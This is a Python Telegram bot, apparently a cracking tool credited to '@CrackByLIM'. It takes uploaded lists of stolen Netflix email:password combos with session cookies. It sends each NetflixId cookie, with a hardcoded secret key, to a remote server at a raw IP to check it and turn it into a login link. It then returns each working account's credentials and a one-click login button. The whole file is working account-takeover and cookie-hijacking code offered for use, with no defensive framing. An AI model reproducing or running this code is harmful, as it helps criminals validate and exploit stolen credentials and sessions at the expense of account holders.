import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# Configuration
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://104.223.121.139:6969/api/gen"
SECRET_KEY = "IpYDCxU9VAxqi88ByaVscqTNDJPg7Cg5"  # Your actual secret key

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found in .env file!")
    print("Please create a .env file with: BOT_TOKEN=your_bot_token_here")
    exit(1)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0

# ==================== API FUNCTIONS ====================

async def check_netflix_id(netflix_id, email):
    """Check if Netflix ID is valid by calling the new API"""
    try:
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"Checking Netflix ID for {email}")
        
        response = requests.post(API_URL, json=data, timeout=10)
        
        try:
            result = response.json()
        except:
            return {
                "success": False, 
                "error": "Invalid JSON response from API",
                "email": email
            }
        
        # Check if the request was successful based on the new API response format
        if result.get('success') == True:
            return {
                "success": True,
                "login_url": result.get('login_url'),
                "email": email,
                "data": result
            }
        else:
            # Handle different error codes from the new API
            error_code = result.get('error_code', 'UNKNOWN_ERROR')
            error_msg = result.get('error', 'Unknown error')
            
            # Provide more user-friendly error messages
            if error_code == 'MISSING_NETFLIX_ID':
                error_msg = "Netflix ID is missing"
            elif error_code == 'MISSING_SECRET_KEY':
                error_msg = "Secret key is missing"
            elif error_code == 'INVALID_SECRET_KEY':
                error_msg = "Invalid secret key - Please check your credentials"
            elif error_code == 'INVALID_NETFLIX_ID':
                error_msg = "Netflix ID is invalid or expired - Please get a fresh Netflix cookie"
            elif error_code == 'MAINTENANCE_MODE':
                error_msg = "System is under maintenance - Please try again later"
            
            return {
                "success": False,
                "error": error_msg,
                "error_code": error_code,
                "email": email
            }
                
    except requests.exceptions.Timeout:
        return {
            "success": False, 
            "error": "API request timeout - Server might be slow",
            "email": email
        }
    except requests.exceptions.ConnectionError:
        return {
            "success": False, 
            "error": "Cannot connect to API server - Please check if the host is available",
            "email": email
        }
    except Exception as e:
        return {
            "success": False, 
            "error": f"API Error: {str(e)}",
            "email": email
        }

# ==================== FILE PARSING ====================

def parse_account_line(line):
    """Parse a single line from the accounts file"""
    try:
        line = line.strip()
        if not line or line.startswith('#'):
            return None
        
        account = {}
        
        # Extract email:password
        email_pass_match = re.match(r'^([^:]+):([^\s|]+)', line)
        if email_pass_match:
            account['email'] = email_pass_match.group(1).strip()
            account['password'] = email_pass_match.group(2).strip()
        else:
            return None
        
        # Extract Netflix Cookies
        cookie_match = re.search(r'NetflixCookies\s*=\s*(NetflixId=[^\s|]+)', line)
        if cookie_match:
            account['cookie'] = cookie_match.group(1).strip()
            # Extract NetflixId
            netflix_id_match = re.search(r'NetflixId=([^&\s]+)', cookie_match.group(1))
            if netflix_id_match:
                account['netflix_id'] = netflix_id_match.group(1).strip()
        
        # Extract other fields (optional)
        fields = {
            'country': r'Country\s*=\s*([^|\n]+)',
            'plan': r'Plan\s*=\s*([^|\n]+)',
            'video_quality': r'VideoQuality\s*=\s*([^|\n]+)',
            'max_streams': r'MaxStreams\s*=\s*([^|\n]+)',
        }
        
        for key, pattern in fields.items():
            match = re.search(pattern, line)
            if match:
                account[key] = match.group(1).strip()
        
        return account
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with premium formatting"""
    user = update.effective_user
    
    welcome = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎬 **NETFLIX ACCOUNT CHECKER PRO** 🎬
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👋 **Welcome, {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send a .txt file** with Netflix accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **Required Format:**
`email:password | NetflixCookies = NetflixId=...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Features:**
✅ Professional processing screen
✅ All valid accounts sent after scan
✅ Premium login links with buttons
✅ Detailed statistics

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/stats - Statistics
/clear - Reset session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🆘 **HELP & INSTRUCTIONS** 🆘
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📁 **STEP 1: PREPARE FILE**
• Create a `.txt` file
• One account per line
• Must include NetflixCookies

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **EXAMPLE:**
`user@email.com:pass123 | NetflixCookies = NetflixId=v%3D3%26ct%3D...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ **STEP 2: UPLOAD**
• Send the file to this chat
• Watch the professional progress screen
• **All valid accounts will be sent after scan completes**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️ **COMMANDS:**
/start - Welcome
/stats - Statistics
/clear - Clear session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **GLOBAL STATISTICS** 📊
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📈 **Performance:**
• **Total Checks:** `{total_checks}`
• **✅ Valid Found:** `{valid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Status:** 🟢 ONLINE

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await update.message.reply_text(
        f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **SESSION CLEARED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

You can now upload a new file.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )

# ==================== FILE HANDLER ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files with professional processing screen"""
    user_id = update.effective_user.id
    global total_checks, valid_accounts
    
    # Check rate limit
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ **RATE LIMIT EXCEEDED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Please wait a minute before trying again.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ **INVALID FILE TYPE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Please upload a `.txt` file.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    # PROFESSIONAL PROCESSING SCREEN
    status_msg = await update.message.reply_text(
        f"""
╔════════════════════════════════════════╗
║     🔄 PROCESSING ACCOUNTS FILE 🔄     ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **File:** `{document.file_name}`
⏳ **Status:** Initializing...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Split into lines
        lines = content.split('\n')
        valid_lines = [l for l in lines if l.strip() and not l.startswith('#')]
        
        if len(valid_lines) == 0:
            await status_msg.edit_text(
                f"""
╔════════════════════════════════════════╗
║           ❌ NO VALID LINES ❌         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No valid account lines found in the file.

Please check the format and try again.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """,
                parse_mode='Markdown'
            )
            return
        
        # Update professional screen
        await status_msg.edit_text(
            f"""
╔════════════════════════════════════════╗
║        📊 ANALYZING FILE 📊            ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **File:** `{document.file_name}`
📝 **Total Lines:** `{len(lines)}`
✅ **Valid Entries:** `{len(valid_lines)}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        
        # Process each line
        valid_count = 0
        invalid_count = 0
        valid_accounts_found = []  # Store all valid accounts
        
        for i, line in enumerate(valid_lines, 1):
            # Parse account
            account = parse_account_line(line)
            if not account or 'netflix_id' not in account:
                invalid_count += 1
                continue
            
            # Calculate progress
            progress = i / len(valid_lines)
            bar_length = 20
            filled = int(bar_length * progress)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            # PROFESSIONAL PROGRESS UPDATE
            progress_text = f"""
╔════════════════════════════════════════╗
║        🔄 PROCESSING ACCOUNTS 🔄       ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **PROGRESS:** `{i}/{len(valid_lines)}`
📈 **COMPLETE:** `{progress*100:.1f}%`
`{bar}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Valid Found:** `{valid_count}`
❌ **Invalid:** `{invalid_count}`
⏳ **Current:** `{account.get('email', 'Unknown')[:30]}...`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
            
            await status_msg.edit_text(progress_text, parse_mode='Markdown')
            
            # Check with API
            email = account.get('email', 'Unknown')
            result = await check_netflix_id(account['netflix_id'], email)
            
            # Update global stats
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                # Store valid account with all details
                valid_accounts_found.append({
                    'email': email,
                    'password': account.get('password', 'N/A'),
                    'login_url': result['login_url'],
                    'country': account.get('country', 'N/A'),
                    'plan': account.get('plan', 'N/A'),
                    'quality': account.get('video_quality', 'N/A'),
                    'streams': account.get('max_streams', 'N/A')
                })
                logger.info(f"✅ Valid account found: {email}")
            else:
                invalid_count += 1
                logger.info(f"❌ Invalid account: {email} - {result.get('error')}")
            
            # Small delay to avoid rate limits
            await asyncio.sleep(0.5)
        
        # PROFESSIONAL COMPLETION SCREEN
        success_rate = valid_count/len(valid_lines)*100 if len(valid_lines) > 0 else 0
        completion_text = f"""
╔════════════════════════════════════════╗
║        ✅ PROCESSING COMPLETE ✅       ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **RESULTS SUMMARY**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **File:** `{document.file_name}`
📝 **Total Processed:** `{len(valid_lines)}`
✅ **Valid Accounts:** `{valid_count}`
❌ **Invalid:** `{invalid_count}`
📈 **Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Sending {valid_count} valid account(s)...**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        await status_msg.edit_text(completion_text, parse_mode='Markdown')
        
        # Send ALL valid accounts AFTER scan is complete
        if valid_accounts_found:
            for idx, acc in enumerate(valid_accounts_found, 1):
                premium_msg = f"""
╔════════════════════════════════════════╗
║     ✅ VALID ACCOUNT #{idx}/{valid_count} ✅     ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 **LOGIN CREDENTIALS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Email:** `{acc['email']}`
• **Password:** `{acc['password']}`
• **Status:** `✅ ACTIVE`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 **ACCOUNT DETAILS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Country:** `{acc['country']}`
• **Plan:** `{acc['plan']}`
• **Quality:** `{acc['quality']}`
• **Max Streams:** `{acc['streams']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 **LOGIN LINK**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`{acc['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *Link expires - use it now!*

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=acc['login_url'])]]
                
                await update.message.reply_text(
                    premium_msg,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
                await asyncio.sleep(0.3)  # Small delay between messages
            
            # Send final summary with all accounts sent
            final_summary = f"""
╔════════════════════════════════════════╗
║        📬 ALL ACCOUNTS SENT 📬         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Successfully sent {valid_count} valid account(s)**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **Check messages above for login links**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
            await update.message.reply_text(final_summary, parse_mode='Markdown')
            
        else:
            # No valid accounts found
            await update.message.reply_text(
                f"""
╔════════════════════════════════════════╗
║        ❌ NO VALID ACCOUNTS ❌         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **RESULT**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No valid accounts were found in your file.

💡 **Suggestions:**
• Get fresh Netflix cookies
• Check file format
• Verify your secret key is correct
• Try again later

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """,
                parse_mode='Markdown'
            )
        
        # Store in session
        user_sessions[user_id] = {
            'last_file': document.file_name,
            'valid': valid_count,
            'invalid': invalid_count,
            'total': valid_count + invalid_count
        }
        
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await status_msg.edit_text(
            f"""
╔════════════════════════════════════════╗
║           ❌ ERROR ❌                  ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **File:** `{document.file_name}`
❌ **Error:** `{str(e)[:100]}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 Please try again or check file format

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )

# ==================== BUTTON CALLBACK ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

# ==================== MAIN FUNCTION ====================

async def main():
    """Start the bot"""
    print("=" * 60)
    print("🎬 PROFESSIONAL NETFLIX ACCOUNT CHECKER")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ API URL: {API_URL}")
    print(f"✅ Secret Key: {SECRET_KEY[:10]}...")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🤖 Bot is running... Press Ctrl+C to stop")
    print("📝 Professional processing screen enabled")
    print("✅ All valid accounts sent AFTER scan")
    print("=" * 60)
    
    # Create application
    application = Application.builder().token(TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("clear", clear_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    # Start the bot
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    # Keep running
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    finally:
        await application.updater.stop()
        await application.stop()
        await application.shutdown()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")
